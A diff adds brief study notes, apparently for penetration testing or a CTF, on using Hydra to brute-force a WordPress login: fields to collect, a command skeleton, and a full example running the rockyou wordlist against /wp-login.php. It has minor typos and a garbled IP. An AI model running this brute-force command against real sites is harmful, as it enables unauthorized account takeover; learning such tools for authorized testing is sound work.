@@ -1,0 +1,30 @@
+** Using the Linus Hydra tool Bruteforce **
+
+	** Requirements **
+	
+<login page Path>:
+<site ip address>:
+<request method>:
+<<msg after invalid credential>:
+<username if present>:
+<Request body>:
+
+	** Recon **
+	
+<login page Path>:- /wp-login.php
+<pswd wordlist>:- ls -la/usr/share/wordlists/rockyou.txt.gz
+<site ip address>:- https://125.0.0.1
+<request method>:- POST
+<msg after invalid credential>:- Invalid username.
+<Request body>:- log=admin&pwd=^PASS^
+
+
+	** The Syntax skeleton of command needed to exec **
+
+sudo hydra <Username/List> <Password/List> <IP> <Method> "<Path>:<RequestBody>:<IncorrectVerbiage>"
+
+
+	** Example **
+
+sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz <Ip Address> https-post-form "/wp-login.php:log=admin&pwd=^PASS^:Invalid username."
+
